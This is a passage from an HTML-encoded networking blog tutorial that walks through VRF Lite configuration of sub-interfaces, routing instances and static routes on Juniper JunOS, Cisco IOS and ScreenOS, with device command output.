&lt;p&gt;Now let&amp;rsquo;s verify the changes and commit them.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jrossi@junos-1# show interfaces fe-0/0/0 
vlan-tagging;
unit 100 {
    description Untrust;
    vlan-id 100;
    family inet {
        address 10.10.10.1/24;
    }
}
unit 200 {
    description Trust;
    vlan-id 200;
    family inet {
        address 172.16.10.1/24;
    }
}
unit 300 {
    description DMZ;
    vlan-id 300;
    family inet {
        address 10.10.10.1/24;
    }
}
unit 400 {
    description Trust;
    vlan-id 400;
    family inet {
        address 192.168.10.1/24;
    }
}

[edit]
jrossi@junos-1# commit 
commit complete
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When we look into the routing you see much more information and can even see the
different routing instances. The global routing table &lt;code&gt;inet.0&lt;/code&gt; is the default
table your would normally work with. Further down the list you see &lt;code&gt;DMZ.inet.0&lt;/code&gt;,
&lt;code&gt;Trust.inet.0&lt;/code&gt;, and &lt;code&gt;Untrust.inet.0&lt;/code&gt;; they are the newly created VRF Lite
routing instances.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
jrossi@junos-1# run show route 

inet.0: 6 destinations, 6 routes (6 active, 0 holddown, 0 hidden)
+ = Active Route, - = Last Active, * = Both

0.0.0.0/0          *[Static/5] 04:27:06
                    &amp;gt; to 10.4.37.1 via fe-0/0/1.0
10.4.37.0/24       *[Direct/0] 1d 20:14:45
                    &amp;gt; via fe-0/0/1.0
10.4.37.9/32       *[Local/0] 1d 20:14:45
                      Local via fe-0/0/1.0
192.168.5.0/24     *[Direct/0] 1d 13:52:37
                    &amp;gt; via fe-0/0/1.0
192.168.5.123/32   *[Local/0] 1d 13:52:37
                      Local via fe-0/0/1.0
224.0.0.5/32       *[OSPF/10] 1d 13:29:19, metric 1
                      MultiRecv

__juniper_private2__.inet.0: 1 destinations, 1 routes (0 active, 0 holddown, 1 hidden)

DMZ.inet.0: 2 destinations, 2 routes (2 active, 0 holddown, 0 hidden)
+ = Active Route, - = Last Active, * = Both

10.10.10.0/24      *[Direct/0] 00:00:06
                    &amp;gt; via fe-0/0/0.300
10.10.10.1/32      *[Local/0] 00:00:06
                      Local via fe-0/0/0.300

Trust.inet.0: 4 destinations, 4 routes (4 active, 0 holddown, 0 hidden)
+ = Active Route, - = Last Active, * = Both

172.16.10.0/24     *[Direct/0] 00:00:18
                    &amp;gt; via fe-0/0/0.200
172.16.10.1/32     *[Local/0] 00:00:18
                      Local via fe-0/0/0.200
192.168.10.0/24    *[Direct/0] 00:00:06
                    &amp;gt; via fe-0/0/0.400
192.168.10.1/32    *[Local/0] 00:00:06
                      Local via fe-0/0/0.400

Untrust.inet.0: 2 destinations, 2 routes (2 active, 0 holddown, 0 hidden)
+ = Active Route, - = Last Active, * = Both

10.10.10.0/24      *[Direct/0] 00:03:26
                    &amp;gt; via fe-0/0/0.100
10.10.10.1/32      *[Local/0] 00:03:26
                      Local via fe-0/0/0.100



&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While having interfaces with addresses and different routing tables is cool and
all, this does next to nothing as there is no real routing going on so let&amp;rsquo;s add
some.&lt;/p&gt;

&lt;p&gt;Start out by adding a default route to the &lt;code&gt;Trust&lt;/code&gt; VRF lite configuration. The
commands to perform this are almost exactly the same for the global routing
table. The only difference is that you start under the &lt;code&gt;routing-instances&lt;/code&gt;
configuration hierarchy. This also applies for routing protocols.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set routing-instances Trust routing-options static route 0.0.0.0/0 next-hop 192.168.10.2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let&amp;rsquo;s verify our configuration and commit the change.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
jrossi@junos-1# show routing-instances Trust 
instance-type virtual-router;
interface fe-0/0/0.200;
interface fe-0/0/0.400;
routing-options {
    static {
        route 0.0.0.0/0 next-hop 192.168.10.2;
    }
}

[edit]
jrossi@junos-1# commit 
commit complete
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let&amp;rsquo;s take a look at the &lt;code&gt;Trust.inet.0&lt;/code&gt; routing table. This time we are
going limit our show route command to just the &lt;code&gt;Trust&lt;/code&gt; table.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
jrossi@junos-1# run show route table Trust 

Trust.inet.0: 5 destinations, 5 routes (5 active, 0 holddown, 0 hidden)
+ = Active Route, - = Last Active, * = Both

0.0.0.0/0          *[Static/5] 00:36:26
                    &amp;gt; to 192.168.10.2 via fe-0/0/0.400
172.16.10.0/24     *[Direct/0] 00:00:18
                    &amp;gt; via fe-0/0/0.200
172.16.10.1/32     *[Local/0] 00:00:18
                      Local via fe-0/0/0.200
192.168.10.0/24    *[Direct/0] 00:56:56
                    &amp;gt; via fe-0/0/0.400
192.168.10.1/32    *[Local/0] 00:56:56
                      Local via fe-0/0/0.400
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;setup-ios:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup on Cisco IOS&lt;/h3&gt;

&lt;p&gt;Cisco IOS is used here and it&amp;rsquo;s very new and buggy 12.4T(22), but as this is
what I installed to test other features of IOS, I figured it would not be a
problem for this write up. It should also be more than adequate for VRF Lite.
Please note that there are a large number of extra interfaces and features
configured on this router as I do lots of playing around with IOS on this
device.&lt;/p&gt;

&lt;p&gt;Just like in the JunOS Example, we are going to create some sub-interfaces to
start off with.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#int gi0/0
ios-1(config-if)#no shut
ios-1(config-i)#int gi0/0.100
ios-1(config-subif)#description Untrust
ios-1(config-subif)#encapsulation dot1Q 100
ios-1(config-subif)#int gi0/0.200
ios-1(config-subif)#description Trust
ios-1(config-subif)#encapsulation dot1Q 200
ios-1(config-subif)#int gi0/0.300
ios-1(config-subif)#description DMZ
ios-1(config-subif)#encapsulation dot1Q 300
ios-1(config-subif)#int gi0/0.400
ios-1(config-subif)#description Trust
ios-1(config-subif)#encapsulation dot1Q 400
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just a quick peek to see that things are as we expect them.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config-subif)#do show ip int br
Interface                  IP-Address      OK? Method Status                Protocol
GigabitEthernet0/0         unassigned      YES NVRAM  up                    up
GigabitEthernet0/0.100     unassigned      YES unset  up                    up
GigabitEthernet0/0.200     unassigned      YES unset  up                    up
GigabitEthernet0/0.300     unassigned      YES unset  up                    up
GigabitEthernet0/0.400     unassigned      YES unset  up                    up
GigabitEthernet0/1         1.1.1.1         YES NVRAM  up                    up
FastEthernet0/3/0          unassigned      YES unset  down                  down
FastEthernet0/3/1          unassigned      YES unset  up                    down
FastEthernet0/3/2          unassigned      YES unset  up                    down
FastEthernet0/3/3          unassigned      YES unset  up                    down
ATM0/1/0                   unassigned      YES NVRAM  administratively down down
ATM0/1/0.1                 unassigned      YES unset  administratively down down
Dot11Radio0/2/0            unassigned      YES NVRAM  up                    up
Dot11Radio0/2/0.1          192.168.128.1   YES NVRAM  up                    up
Dot11Radio0/2/0.3          192.168.11.1    YES NVRAM  up                    up
Dot11Radio0/2/0.4          192.168.4.1     YES NVRAM  up                    up
Dot11Radio0/2/0.5          unassigned      YES unset  up                    up
Dot11Radio0/2/0.10         192.168.10.1    YES NVRAM  up                    up
Dot11Radio0/2/1            unassigned      YES NVRAM  administratively down down
Vlan1                      unassigned      YES NVRAM  up                    down
Vlan3                      192.168.3.1     YES NVRAM  up                    down
Vlan5                      unassigned      YES NVRAM  up                    down
Vlan20                     192.168.20.1    YES NVRAM  up                    down
NVI0                       192.168.1.1     YES unset  up                    up
SSLVPN-VIF0                unassigned      NO  unset  up                    up
BVI3                       192.168.5.1     YES NVRAM  up                    up
Loopback1                  192.168.1.1     YES NVRAM  up                    up
Loopback69                 192.168.69.1    YES NVRAM  up                    up
Loopback100                unassigned      YES NVRAM  up                    up
Loopback666                10.10.10.2      YES NVRAM  up                    up
Tunnel255                  192.168.255.2   YES NVRAM  up                    up

ios-1(config-subif)#do show int desc
Interface                      Status         Protocol Description
Gi0/0                          up             up
Gi0/0.100                      up             up       Untrust
Gi0/0.200                      up             up       Trust
Gi0/0.300                      up             up       DMZ
Gi0/0.400                      up             up       Trust
Gi0/1                          up             up
Fa0/3/0                        down           down
Fa0/3/1                        up             down
Fa0/3/2                        up             down
Fa0/3/3                        up             down
AT0/1/0                        admin down     down
AT0/1/0.1                      admin down     down
Do0/2/0                        up             up
Do0/2/0.1                      up             up
Do0/2/0.3                      up             up
Do0/2/0.4                      up             up
Do0/2/0.5                      up             up
Do0/2/0.10                     up             up
Do0/2/1                        admin down     down
Vl1                            up             down
Vl3                            up             down
Vl5                            up             down
Vl20                           up             down
NV0                            up             up
SS0                            up             up
BV3                            up             up
Lo1                            up             up
Lo69                           up             up       for webvpn
Lo100                          up             up
Lo666                          up             up
Tu255                          up             up

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Much like in the JunOS configuration we will now create three new routing
instances (VRF Lite).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#ip vrf
ios-1(config)#ip vrf Untrust
ios-1(config-vrf)#ip vrf Untrust
ios-1(config-vrf)#description Scary wild wild west
ios-1(config-vrf)#ip vrf Trust
ios-1(config-vrf)#ip vrf DMZ
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
&lt;p&gt;I don&amp;rsquo;t give a hoot in Hell how you do it, you just get me to the Primary, ya hear!&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Major T. J. &amp;quot;King&amp;quot; Kong&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now let&amp;rsquo;s configure some interfaces and add some addresses. Once again, I am
going to use overlapping ranges to show that VRF Lite allows for it.&lt;/p&gt;

&lt;p&gt;Adding interfaces to a routing instance is configured under the actual interface
configuration hierarchy with the command &lt;code&gt;ip vrf forward&lt;/code&gt;. If you have an
address already assigned when you run the &lt;code&gt;ip vrf forwarding&lt;/code&gt; the address will
be removed. This is done to make sure that conflicts or pollution of the new
routing table doesn&amp;rsquo;t happen unintentionally.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#int gi0/0.100
ios-1(config-subif)#ip vrf forwarding Untrust
ios-1(config-subif)#ip address 10.10.10.1 255.255.255.0
ios-1(config-subif)#int gi0/0.200
ios-1(config-subif)#ip vrf forwarding Trust
ios-1(config-subif)#ip address 172.16.10.1 255.255.255.0
ios-1(config-subif)#int gi0/0.300
ios-1(config-subif)#ip vrf forwarding DMZ
ios-1(config-subif)#ip address 10.10.10.1 255.255.255.0
ios-1(config-subif)#int gi0/0.400
ios-1(config-subif)#ip vrf forwarding Trust
ios-1(config-subif)#ip address 192.168.10.1 255.255.255.0

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Before we move forward, let&amp;rsquo;s look into some of the show commands around VRFs on IOS.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1#show ip vrf 
  Name                             Default RD          Interfaces
  DMZ                              &amp;lt;not set&amp;gt;           Gi0/0.300
  Trust                            &amp;lt;not set&amp;gt;           Gi0/0.200
                                                       Gi0/0.400
  Untrust                          &amp;lt;not set&amp;gt;           Gi0/0.100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The command &lt;code&gt;show ip route&lt;/code&gt; Cisco IOS will not show you anything about the other
routing instances, just the global table.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config-subif)#do show ip route
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is 1.1.1.2 to network 0.0.0.0

C    192.168.128.0/24 is directly connected, Dot11Radio0/2/0.1
C    192.168.10.0/24 is directly connected, Dot11Radio0/2/0.10
C    192.168.11.0/24 is directly connected, Dot11Radio0/2/0.3
C    192.168.4.0/24 is directly connected, Dot11Radio0/2/0.4
C    192.168.5.0/24 is directly connected, BVI3
C    1.1.1.0/24 is directly connected, GigabitEthernet0/1
     192.168.255.0/30 is subnetted, 1 subnets
C       192.168.255.0 is directly connected, Tunnel255
     192.168.1.0/32 is subnetted, 1 subnets
C       192.168.1.1 is directly connected, Loopback1
C    192.168.69.0/24 is directly connected, Loopback69
O    192.168.2.0/24 [110/1001] via 192.168.255.1, 1d07h, Tunnel255
S*   0.0.0.0/0 [1/0] via 1.1.1.2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the command &lt;code&gt;show ip route vrf&lt;/code&gt; we can see into each routing table, or
the use of &lt;code&gt;show ip route vrf *&lt;/code&gt; will let us see them all at once.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ios-1#show ip route vrf *
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is 1.1.1.1 to network 0.0.0.0

C    192.168.128.0/24 is directly connected, Dot11Radio0/2/0.1
C    192.168.10.0/24 is directly connected, Dot11Radio0/2/0.10
C    192.168.11.0/24 is directly connected, Dot11Radio0/2/0.3
C    192.168.4.0/24 is directly connected, Dot11Radio0/2/0.4
C    192.168.20.0/24 is directly connected, Vlan20
C    192.168.5.0/24 is directly connected, BVI3
C    1.1.1.0/24 is directly connected, GigabitEthernet0/1
     192.168.255.0/30 is subnetted, 1 subnets
C       192.168.255.0 is directly connected, Tunnel255
     192.168.1.0/32 is subnetted, 1 subnets
C       192.168.1.1 is directly connected, Loopback1
C    192.168.69.0/24 is directly connected, Loopback69
O    192.168.2.0/24 [110/1001] via 192.168.255.1, 1d14h, Tunnel255
C    192.168.3.0/24 is directly connected, Vlan3
S*   0.0.0.0/0 [1/0] via 1.1.1.1

Routing Table: Untrust
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is not set

     10.0.0.0/24 is subnetted, 1 subnets
C       10.10.10.0 is directly connected, GigabitEthernet0/0.100

Routing Table: Trust
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is not set

C    192.168.10.0/24 is directly connected, GigabitEthernet0/0.400
     172.16.0.0/24 is subnetted, 1 subnets
C       172.16.10.0 is directly connected, GigabitEthernet0/0.200

Routing Table: DMZ
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is not set

     10.0.0.0/24 is subnetted, 1 subnets
C       10.10.10.0 is directly connected, GigabitEthernet0/0.300
ios-1#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now lets do a little routing.  Just like in the JunOS example a simple static route should be sufficient.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#ip route vrf Trust 0.0.0.0 0.0.0.0 192.168.10.2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;Trust&lt;/code&gt; routing instance table now looks like the following.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ios-1(config)#do show ip route vrf Trust

Routing Table: Trust
Codes: C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route

Gateway of last resort is 192.168.10.2 to network 0.0.0.0

C    192.168.10.0/24 is directly connected, GigabitEthernet0/0.400
     172.16.0.0/24 is subnetted, 1 subnets
C       172.16.10.0 is directly connected, GigabitEthernet0/0.200
S*   0.0.0.0/0 [1/0] via 192.168.10.2
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;setup-screenos:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup on Juniper ScreenOS&lt;/h3&gt;

&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/ssg-5-shjpg.jpeg&#34; border=&#34;0&#34; alt=&#34;SSG-5-SH.jpg.jpeg&#34; width=&#34;300&#34; height=&#34;60&#34; /&gt;&lt;/div&gt;

&lt;p&gt;Juniper ScreenOS version 6.2.0r2.0 used here is very new and has been working
very well for me in testing.&lt;/p&gt;

&lt;p&gt;There are also a few more limitations on the ScreenOS platform that I need to
make note of. The SSG5 I am using has a limit of only 3 routing instances and
some other limits that you should verify yourself before starting. Using the
command &lt;code&gt;get license-key&lt;/code&gt; will show all the limits for the hardware. The key
things to look for are: &lt;em&gt;Vrouters&lt;/em&gt;, &lt;em&gt;Zones&lt;/em&gt;, and &lt;em&gt;VLANs&lt;/em&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get license-key 
extended_key        : XXXXXXXXXXXXX+XXXXXXXXXXXXXXXXXXXXXXX+XXXXXXXXXXXX
                      XXXXXXXXXXXXXXXXXXX/
                      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
                      XXXXXXXXXXXXXXXXXXXXXXXX/
                      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX+XXXXXXXXXXXX/
                      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX+XXXXXXXXXXXXXXXX
                      /XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX++XXXXXXXXXXXXXX/
                      XXXXXXXXXXXXXX+XXXXXX+XXXXXXXXXXXXXXXXXXXXXXXXXXXX
                      ==

Sessions:           16064 sessions
Capacity:           unlimited number of users
NSRP:               ActiveActive
VPN tunnels:        40 tunnels
Vsys:               None
Vrouters:           4 virtual routers
Zones:              10 zones
VLANs:              50 vlans
Drp:                Enable
Deep Inspection:    Enable
Deep Inspection Database Expire Date: Disable
Signature pack:     Signature update key is missing
IDP:                Disable
AV:                 Disable(0)
Anti-Spam:          Disable(0)
Url Filtering:      Disable

Update server url: nextwave.netscreen.com/key_retrieval
License key auto update : Disabled
Auto update interval : 0 days
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Unlike IOS and JunOS: ScreenOS does not have a concept of Global routing
instance. Every interface must be in routing instances and can not have any
addresses assigned when you move them to a different instance. Due to this, you
really should start off in a different order and create the routing instances
first.&lt;/p&gt;

&lt;p&gt;The default ScreenOS puts all interfaces into the &lt;code&gt;Trust-vr&lt;/code&gt; routing instance so
let&amp;rsquo;s start by checking what is already set up.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get vrouter
* indicates default vrouter 
A - AutoExport, R - RIP, N- NHRP, O - OSPF, B - BGP, P - PIM

   ID Name                     Vsys                 Owner     Routes    MRoutes     Flags
    1 untrust-vr               Root                 shared      0/max       0/max       
*   2 trust-vr                 Root                 shared      4/max       0/max       

total 2 vrouters shown and 0 of them defined by user
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see there are already 2 routing instances set up. Let&amp;rsquo;s take a look
at the interfaces that belong to each. To do this we need to see what zones are
mapped to which routing instances.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get zone  
Total 14 zones created in vsys Root - 8 are policy configurable.
Total policy configurable zones for Root is 8.
;------------------------------------------------------------------------
  ID Name                             Type    Attr    VR          Default-IF   VSYS      
   0 Null                             Null    Shared untrust-vr   wireless0/3  Root                
   1 Untrust                          Sec(L3) Shared trust-vr     ethernet0/0  Root                
   2 Trust                            Sec(L3)        trust-vr     bgroup0      Root                
   3 DMZ                              Sec(L3)        trust-vr     ethernet0/1  Root                
   4 Self                             Func           trust-vr     self         Root                
   5 MGT                              Func           trust-vr     null         Root                
   6 HA                               Func           trust-vr     null         Root                
  10 Global                           Sec(L3)        trust-vr     null         Root                
  11 V1-Untrust                       Sec(L2) Shared trust-vr     v1-untrust   Root                
  12 V1-Trust                         Sec(L2) Shared trust-vr     v1-trust     Root                
  13 V1-DMZ                           Sec(L2) Shared trust-vr     v1-dmz       Root                
  14 VLAN                             Func    Shared trust-vr     vlan1        Root                
  15 V1-Null                          Sec(L2) Shared trust-vr     l2v          Root                
  16 Untrust-Tun                      Tun            trust-vr     hidden.1     Root                
;------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we have to map the interfaces to the zones. (Yes, it may seem a little
convoluted but it does make sense for a firewall platform).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get interface 

A - Active, I - Inactive, U - Up, D - Down, R - Ready 

Interfaces in vsys Root: 
Name           IP Address                        Zone        MAC            VLAN State VSD      
serial0/0      0.0.0.0/0                         Null        N/A               -   D   -  
eth0/0         0.0.0.0/0                         Untrust     0017.cb80.9f40    -   U   -  
eth0/1         0.0.0.0/0                         DMZ         0017.cb80.9f45    -   D   -  
wireless0/0    192.168.2.1/24                    Trust       0017.cb80.9f55    -   D   -  
wireless0/1    0.0.0.0/0                         Null        0017.cb80.9f56    -   D   -  
wireless0/2    0.0.0.0/0                         Null        0017.cb80.9f57    -   D   -  
wireless0/3    0.0.0.0/0                         Null        0017.cb80.9f58    -   D   -  
bgroup0        192.168.1.1/24                    Trust       0017.cb80.9f4b    -   U   -  
  eth0/2       N/A                               N/A         N/A               -   U   -
  eth0/3       N/A                               N/A         N/A               -   D   -
  eth0/4       N/A                               N/A         N/A               -   D   -
  eth0/5       N/A                               N/A         N/A               -   D   -
  eth0/6       N/A                               N/A         N/A               -   D   -
bgroup1        0.0.0.0/0                         Null        0017.cb80.9f4c    -   D   -  
bgroup2        0.0.0.0/0                         Null        0017.cb80.9f4d    -   D   -  
bgroup3        0.0.0.0/0                         Null        0017.cb80.9f4e    -   D   -  
vlan1          0.0.0.0/0                         VLAN        0017.cb80.9f4f    1   D   -  
null           0.0.0.0/0                         Null        N/A               -   U   0  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We now have all the information we need to begin the process. Here is a
simplified table to make moving forward a little easier:&lt;/p&gt;

&lt;h5 id=&#34;current:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Current&lt;/h5&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Interface&lt;/th&gt;
&lt;th&gt;Zone&lt;/th&gt;
&lt;th&gt;Routing Instance&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;serial0/0&lt;/td&gt;
&lt;td&gt;Null&lt;/td&gt;
&lt;td&gt;trust-vr&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;eth0/0&lt;/td&gt;
&lt;td&gt;Untrust&lt;/td&gt;
&lt;td&gt;trust-vr&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;eth0/1&lt;/td&gt;
&lt;td&gt;DMZ&lt;/td&gt;
&lt;td&gt;trust-vr&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;wireless0/0&lt;/td&gt;
&lt;td&gt;Trust&lt;/td&gt;
&lt;td&gt;trust-vr&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Now let&amp;rsquo;s start by creating the one routing instance that is not already setup by default.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set vrouter name dmz-vr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let&amp;rsquo;s see how this shows up on the device.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;creenos-1-&amp;gt; get vrouter
* indicates default vrouter 
A - AutoExport, R - RIP, N- NHRP, O - OSPF, B - BGP, P - PIM

   ID Name                     Vsys                 Owner     Routes    MRoutes     Flags
    1 untrust-vr               Root                 shared      0/max       0/max       
*   2 trust-vr                 Root                 shared      4/max       0/max       
 1025 dmz-vr                   Root                 user        0/max       0/max       

total 3 vrouters shown and 1 of them defined by user
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Due to the limitations of not allowing the movement of a zone between routing
instances when there are interfaces within them, we need to move things around
first. Let&amp;rsquo;s start by moving all the interfaces that are in the &lt;em&gt;Trust&lt;/em&gt; and
&lt;em&gt;DMZ&lt;/em&gt; zones to a holder zone named &lt;em&gt;Null&lt;/em&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set interface eth0/0 zone Null
screenos-1-&amp;gt; set interface eth0/1 zone Null
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we need to move the zones to the correct routing instances, and while we&amp;rsquo;re
at it let&amp;rsquo;s move the interfaces back and create new sub-interfaces.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set zone Untrust vrouter untrust-vr
screenos-1-&amp;gt; set zone DMZ vrouter dmz-vr
screenos-1-&amp;gt; set interface eth0/0 zone Untrust
screenos-1-&amp;gt; set interface eth0/1 zone DMZ
screenos-1-&amp;gt; set interface eth0/0.1 tag 100 zone Untrust
screenos-1-&amp;gt; set interface eth0/0.2 tag 200 zone Trust
screenos-1-&amp;gt; set interface eth0/0.3 tag 300 zone DMZ
screenos-1-&amp;gt; set interface eth0/0.4 tag 400 zone Trust

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally, let&amp;rsquo;s setup the interface addresses.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; set interface eth0/0.1 ip 10.10.10.1/24
screenos-1-&amp;gt; set interface eth0/0.2 ip 172.16.10.1/24
screenos-1-&amp;gt; set interface eth0/0.3 ip 10.10.10.1/24
screenos-1-&amp;gt; set interface eth0/0.4 ip 192.168.10.1/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we should take a look and see that everything has come out the way we
expected. First, the interfaces:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;screenos-1-&amp;gt; get interface 

A - Active, I - Inactive, U - Up, D - Down, R - Ready 

Interfaces in vsys Root: 
Name           IP Address                        Zone        MAC            VLAN State VSD      
serial0/0      0.0.0.0/0                         Null        N/A               -   D   -  
eth0/0         0.0.0.0/0                         Untrust     0017.cb80.9f40    -   U   -  
eth0/0.1       0.0.0.0/0                         Untrust     0017.cb80.9f40  100   U   -  
eth0/0.2       0.0.0.0/0                         Trust       0017.cb80.9f40  200   U   -  
eth0/0.3       0.0.0.0/0                         DMZ         0017.cb80.9f40  300   U   -  
eth0/0.4       0.0.0.0/0                         Trust       0017.cb80.9f40  400   U   -  
eth0/1         0.0.0.0/0                         DMZ         0017.cb80.9f45    -   D   -  
wireless0/0    192.168.2.1/24                    Trust       0017.cb80.9f55    -   D   -  
wireless0/1    0.0.0.0/0                         Null        0017.cb80.9f56    -   D   -  
wireless0/2    0.0.0.0/0                         Null        0017.cb80.9f57    -   D   -  
wireless0/3    0.0.0.0/0                         Null        0017.cb80.9f58    -   D   -  
bgroup0        192.168.1.1/24                    Trust       0017.cb80.9f4b    -   U   -  
  eth0/2       N/A                               N/A         N/A               -   U   -
  eth0/3       N/A                               N/A         N/A               -   D   -
  eth0/4       N/A                               N/A         N/A               -   D   -
